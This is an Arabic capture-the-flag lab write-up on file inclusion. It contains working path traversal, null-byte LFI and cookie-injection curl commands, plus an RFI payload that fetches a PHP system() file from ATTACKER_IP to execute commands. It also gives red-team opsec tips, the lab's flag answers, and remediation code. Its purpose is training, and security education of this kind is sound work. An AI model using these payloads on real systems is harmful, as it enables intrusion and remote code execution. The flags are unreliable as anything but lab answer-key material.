# غرفة تضمين الملفات (File Inclusion) - التوثيق الفني الشامل

---

## 1. نظرة عامة على الغرفة والبنية الهيكلية (Room Overview & Architecture)

تُعد ثغرات تضمين الملفات (File Inclusion) من أخطر الثغرات الأمنية المؤثرة على تطبيقات الويب، حيث تصنف مباشرة تحت **OWASP Top 10 (A01: Broken Access Control و A03: Injection)**. تنشأ هذه الثغرات نتيجة معالجة غير آمنة لمسارات الملفات الممررة من المستخدم إلى دوال نظام الملفات أو محركات تنفيذ السكربتات (مثل PHP و Node.js و Python)، مما يتيح للمهاجم قراءة ملفات النظام الحساسة أو كشف الكود المصدري أو تحقيق تنفيذ الأوامر عن بُعد (Remote Code Execution - RCE).

تقدم هذه الغرفة تغطية تشريحية وعملية كاملة لثلاثة محاور رئيسية:
1. **اجتياز المسارات (Path Traversal):** استغلال تتابعات `../` لقراءة الملفات خارج مسار الويب الرئيسي.
2. **التضمين المحلي للملفات (Local File Inclusion - LFI):** إجبار دوال التضمين (`include`, `require`) على معالجة ملفات محلية، واستغلال تقنيات الالتفاف كحقن البايت الفارغ `%00`، والحذف غير التكراري، وبادئات المجلدات الإلزامية.
3. **التضمين البعيد للملفات (Remote File Inclusion - RFI):** حقن عناوين URL خارجية واستدعاء أكواد خبيثة من خوادم المهاجم لتحقيق RCE فوري.

```
+-----------------------------------------------------------------------------------+
|                        FILE INCLUSION LAB ARCHITECTURE                            |
+-----------------------------------------------------------------------------------+
|                                                                                   |
|  Attacker Machine (Kali / AttackBox)                 Target Server (Apache / PHP) |
|  ===================================                 ============================ |
|                                                                                   |
|  1. Path Traversal / LFI ---------------------------> GET /lab1.php?file=/etc/pwd |
|     (Reads Sensitive Files)                          Returns: root:x:0:0...       |
|                                                                                   |
|  2. Null Byte Bypass -------------------------------> GET /lab3.php?file=...%00   |
|     (Bypasses .php Extension)                        Truncates appended string    |
|                                                                                   |
|  3. Header / Cookie Injection ----------------------> Cookie: THM=../../etc/flag2 |
|     (Captures Flag 2)                                Flag: c00k13_i5_yuMmy1       |
|                                                                                   |
|  4. Remote File Inclusion (RFI) --------------------> GET /playground.php         |
|     Host: python3 -m http.server 8000                 ?file=http://ATTACKER/sh.txt|
|     Target fetches and executes payload <------------ Server executes hostname!   |
|     RCE Confirmed ----------------------------------> Flag: lfi-vm-thm-f8c5b1...  |
|                                                                                   |
+-----------------------------------------------------------------------------------+
```

---

## 2. الجمهور المستهدف والمتطلبات المسبقة (Target Audience & Prerequisites)

* **الجمهور المستهدف:**
  - مختبرو اختراق تطبيقات الويب (Web Penetration Testers).
  - مهندسو أمان التطبيقات (AppSec Engineers) ومطورو الواجهات الخلفية (Backend Developers).
  - محللو المراكز الأمنية (SOC Analysts) والباحثون الأمنيون.
* **المتطلبات المسبقة:**
  - فهم هيكلية أنظمة ملفات لينكس (Linux Hierarchy: `/etc`, `/var`, `/proc`).
  - دراية بأساسيات لغة PHP ودوالها للتعامل مع الملفات (`include`, `require`, `file_get_contents`).
  - إتقان أدوات الشبكة الأساسية: `curl`, `Burp Suite`, وخوادم بايثون (`python3 -m http.server`).

---

## 3. أهداف التعلم والمفاهيم الجوهرية (Learning Objectives & Core Concepts)

1. التمييز الدقيق بين ثغرة اجتياز المسارات (Path Traversal) والتضمين المحلي (LFI) والتضمين البعيد (RFI).
2. تحديد الدوال البرمجية الحساسة المسببة للثغرات في لغة PHP (`file_get_contents`, `include`).
3. إتقان تقنيات الالتفاف على الفلاتر:
   - حقن البايت الفارغ `%00` لقطع الامتدادات الإجبارية.
   - تجاوز الحذف غير التكراري عبر مضاعفة التتابعات (`....//`).
   - الالتفاف على اشتراط مجلد البداية الإلزامي.
4. استغلال ثغرة RFI لتحقيق تنفيذ الأوامر عن بُعد (RCE) عبر استضافة حمولات خارجية.
5. استغلال وسائط الإدخال المختلفة (معلمات GET، ومعلمات POST، وترويسات الكوكيز).
6. تطبيق مبدأ القوائم البيضاء والتحصين الهندسي لمنع الثغرة جذرياً.

---

## 4. الأسس النظرية والتشريح التقني (Theoretical Foundations & Technical Deep Dive)

### 4.1 الفارق الهندسي بين Path Traversal و LFI
* **اجتياز المسارات (Path Traversal):**
  - يعتمد على دوال قراءة الملفات الخام مثل `file_get_contents()` أو `readfile()`.
  - المخرج يكون نصاً صريحاً دائماً. إذا قرأ ملف `index.php`، فإنه يعرض الكود البرمجي كنص دون تنفيذه.
* **التضمين المحلي (Local File Inclusion):**
  - يعتمد على دوال استدعاء ومحاذاة الأكواد مثل `include()` أو `require()`.
  - إذا كان الملف يحتوي على وسوم `<?php ?>`، فإن الخادم ينفذها داخل سياق المعالجة، مما يتيح هجمات تسميم السجلات (Log Poisoning) لتنفيذ الأوامر.

### 4.2 الشروط الإلزامية لثغرة التضمين البعيد (RFI)
في ملف تكوين PHP (`php.ini`):
1. `allow_url_fopen = On`: تتيح التعامل مع عناوين الـ URL كملفات عادية.
2. `allow_url_include = On`: تتيح لدوال `include` و `require` جلب محتوى من روابط خارجية وتنفيذه.
إذا كان الخيار الثاني مفعلاً، فإن أي مدخل غير معقم في دالة تضمين يعني سيطرة كاملة للمهاجم بضغطة زر واحدة.

---

## 5. طوبولوجيا المعمل وسطح الهجوم (Practical Lab Topology & Attack Surface)

* **الهدف:** آلة افتراضية تستضيف بيئة تعليمية تفاعلية عبر المنفذ 80 (`http://MACHINE_IP`).
* **نقاط النهاية وسطح الهجوم:**
  - `/lab1.php`: مسار إدخال مباشر بدون بادئة.
  - `/lab2.php`: بادئة مجلد مسبقة (`includes/`).
  - `/lab3.php`: امتداد مسبق (`.php`) يتطلب حقن البايت الفارغ `%00`.
  - `/lab4.php`: فلترة نصية تتطلب تجاوزات المسارات المتقدمة.
  - `/lab5.php`: فلتر حذف غير تكراري لرموز `../`.
  - `/lab6.php`: اشتراط بادئة مجلد إلزامي (`THM-profile/`).
  - `/playground.php`: معمل مخصص لاختبار التضمين البعيد RFI.
  - `/challenges/index.php`: تحديات استخراج الأعلام عبر POST والكوكيز.

---

## 6. الأدوات والتقنيات والبروتوكولات (Tools, Technologies & Protocols)

* **الأدوات:**
  - `curl` (أداة سطر الأوامر لتنفيذ الطلبات وحقن الترويسات والبايتات الخاصة).
  - `Burp Suite` (اعتراض الطلبات وتعديلها وتحويل GET إلى POST).
  - `Python HTTP Server` (`python3 -m http.server 8000` لاستضافة حمولات RFI).
  - أدوات فحص وتعديل الكوكيز في المتصفح (DevTools Storage).
* **البروتوكولات:**
  - HTTP/1.1 (GET, POST, Headers, Cookies).
  - PHP Wrappers (`php://filter`, `data://`).

---

## 7. مصفوفة تنفيذ المهام خطوة بخطوة (Step-by-Step Task Execution Matrix)

| المهمة | الموضوع | الإجراء المنفذ | النتيجة الموثقة |
| :---: | :--- | :--- | :---: |
| **01** | Introduction | استيعاب المفاهيم النظرية وتصنيفات OWASP | `No answer needed` |
| **02** | Deploy the VM | تشغيل البيئة الافتراضية والتأكد من استجابة خادم الويب | `No answer needed` |
| **03** | Path Traversal | تشريح دوال قراءة الملفات في PHP | `file_get_contents` |
| **04** | LFI (Part 1) | استدعاء المسار المطلق في Lab 1 وكشف مجلد Lab 2 | `/lab1.php?file=/etc/passwd` و `includes` |
| **05** | LFI (Part 2) | الالتفاف على الفلاتر واستخراج إصدار النظام | `%00` و `file_get_contents` و `THM-profile` و `12.04` |
| **06** | RFI | تشريح شروط التضمين البعيد في `php.ini` | `No answer needed` |
| **07** | Challenge | استخراج الأعلام الثلاثة + RCE Hostname | 3 أعلام + `lfi-vm-thm-f8c5b1a78692` |
| **08** | Remediation | دراسة القوائم البيضاء الصارمة وتحصين الخادم | `No answer needed` |

---

## 8. دليل العمليات الهجومية والتنفيذ العملي (Offensive Security Playbook)

### المرحلة 1: استغلال التضمين المحلي المباشر (Labs 1-6)
```bash
# Lab 1: قراءة /etc/passwd بالمسار المطلق
curl -s "http://MACHINE_IP/lab1.php?file=/etc/passwd"

# Lab 2: اجتياز المجلد المسبق includes/
curl -s "http://MACHINE_IP/lab2.php?file=../../../../etc/passwd"

# Lab 3: كسر الامتداد الإجباري .php بالبايت الفارغ
curl -s "http://MACHINE_IP/lab3.php?file=../../../../etc/passwd%00"

# Lab 6: تلبية شرط المجلد الإلزامي وقراءة إصدار النظام
curl -s "http://MACHINE_IP/lab6.php?file=THM-profile/../../../../../etc/os-release"
# -> VERSION_ID="12.04"
```

### المرحلة 2: حل تحديات الأعلام (Challenge Section)
```bash
# العلم 1: تعديل الطلب إلى POST مع البايت الفارغ
curl -s -X POST "http://MACHINE_IP/challenges/chall1.php" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "file=../../../../etc/flag1%00"
# -> العلم: F1x3d-iNpu7-f0rrn

# العلم 2: استغلال ثغرة LFI المعتمدة على الكوكي
curl -s "http://MACHINE_IP/challenges/chall2.php" \
     -H "Cookie: THM=../../../../etc/flag2%00"
# -> العلم: c00k13_i5_yuMmy1

# العلم 3: استغلال مصفوفة $_REQUEST بتمرير المدخل عبر POST
curl -s -X POST "http://MACHINE_IP/challenges/chall3.php" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "file=../../../../etc/flag3%00"
# -> العلم: P0st_1s_w0rk1in9
```

### المرحلة 3: تنفيذ الأوامر عن بُعد عبر RFI (Playground)
1. إنشاء ملف الحمولة على جهاز المهاجم:
   ```bash
   echo "<?php system('hostname'); ?>" > hostname.txt
   python3 -m http.server 8000
   ```
2. استدعاء الحمولة عبر رابط RFI:
   ```bash
   curl -s "http://MACHINE_IP/playground.php?file=http://ATTACKER_IP:8000/hostname.txt"
   ```
3. النتيجة: ظهور اسم مضيف الآلة: **`lfi-vm-thm-f8c5b1a78692`**.

---

## 9. مخطط الدفاع والتحصين والمعالجة الجذرية (Defensive & Remediation Blueprint)

1. **الاعتماد الصارم على القوائم البيضاء (Allowlisting):**
   ```php
   $allowed_pages = [
       'home' => 'pages/home.php',
       'about' => 'pages/about.php',
       'contact' => 'pages/contact.php'
   ];
   $page = $_GET['page'] ?? 'home';
   if (!array_key_exists($page, $allowed_pages)) {
       die("Access Denied: Invalid Page.");
   }
   include($allowed_pages[$page]);
   ```
2. **تحصين ملف تكوين `php.ini`:**
   ```ini
   allow_url_fopen = Off
   allow_url_include = Off
   display_errors = Off
   log_errors = On
   ```
3. **تطهير المسارات بدوال النظام المعيارية:**
   ```php
   $clean_file = basename($_GET['file']); // Strips all directory separators
   ```

---

## 10. الأمن العملياتي وفنون الريد تيم (OpSec & Red Team Operational Tradecraft)

* **تجنب تدمير ملفات السجلات أثناء Log Poisoning:** عند حقن كود PHP في سجلات Apache (`access.log`)، تأكد من صحة كود PHP تماماً قبل إرساله؛ لأن أي خطأ نحوي (Syntax Error) سيعطل مفسر PHP ويمنع تنفيذ السجل بالكامل وقد يؤدي لحرمان الخدمة أو كشف العملية.
* **البصمة الشبكية لتضمين الملفات البعيدة:** خوادم الـ SIEM تراقب اتصالات الـ Outbound الغريبة القادمة من خوادم الويب. خادم ويب يتصل بجهاز خارجي لجلب ملف نصي يُعد إنذاراً أحمر فورياً (IoC).

---

## 11. استخبارات التهديدات الواقعية وحالات دراسية (Real-World Threat Intelligence & Case Studies)

* **استغلال ثغرات LFI في ملحقات WordPress الشائعة:**
  - تاريخياً، تعرضت آلاف المواقع للاختراق عبر إضافات ووردبريس (مثل Slider Revolution) حيث سمحت ثغرات Path Traversal للمهاجمين بقراءة ملف `wp-config.php` واستخراج كلمات مرور قواعد البيانات الحساسة.
* **ثغرات Log4j (CVE-2021-44228):**
  - على الرغم من كونها ثغرة JNDI Injection في بيئة جافا، إلا أن المفهوم الجوهري لاستدعاء كود خارجي عبر بروتوكول شبكي عن بُعد يتطابق فلسفياً مع مخاطر التضمين البعيد RFI.

---

## 12. استكشاف الأخطاء ومعالجة الحالات المعقدة (Comprehensive Troubleshooting & Edge Cases)

* **المشكلة:** عند استخدام `%00`، لا يتوقف الخادم عن قراءة الامتداد ويظهر خطأ `File Not Found`.
  - **السبب:** إصدار PHP هو 5.3.4 أو أحدث، حيث تم إغلاق ثغرة البايت الفارغ على مستوى النواة.
  - **الحل:** البحث عن مسارات أخرى (مثل استغلال ثغرات رفع الملفات أو استخدام الأغلفة `php://filter`).
* **المشكلة:** ثغرة RFI لا تتصل بجهاز المهاجم وتستغرق وقتاً طويلاً (Connection Timeout).
  - **السبب:** جدار الحماية (Firewall) يمنع الاتصال بالمنفذ، أو أن الخادم المستهدف لا يملك مسار شبكة مباشر لـ IP المهاجم (تأكد من عنوان IP في واجهة `tun0`).

---

## 13. التحقق المعرفي والتقييم الذاتي (Knowledge Verification & Self-Assessment)

1. ما الفرق الجوهري بين مخرجات دالة `file_get_contents()` ومخرجات دالة `include()` عند قراءة ملف PHP؟
2. لماذا تم إيقاف العمل بثغرة البايت الفارغ (`%00`) في الإصدارات الحديثة من لغة PHP؟
3. ما هي الشروط الإلزامية في ملف `php.ini` لكي تنجح ثغرة Remote File Inclusion؟
4. كيف يمكن استغلال غلاف `php://filter` لقراءة الكود المصدري دون تنفيذه؟

---

## 14. المراجع والقراءات المتقدمة (References & Further Reading)

* [ملف المراجع والتوثيق المعتمد للغرفة](../../03-FILE-INCLUSION/REFERENCES.md)
* [الملاحظات التقنية والشروح المعمقة](../../03-FILE-INCLUSION/ADDITIONAL-NOTES.md)
* [مصفوفة مهام وحلول الغرفة](../../03-FILE-INCLUSION/TASKS.md)
* [OWASP Path Traversal Verification Guide](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
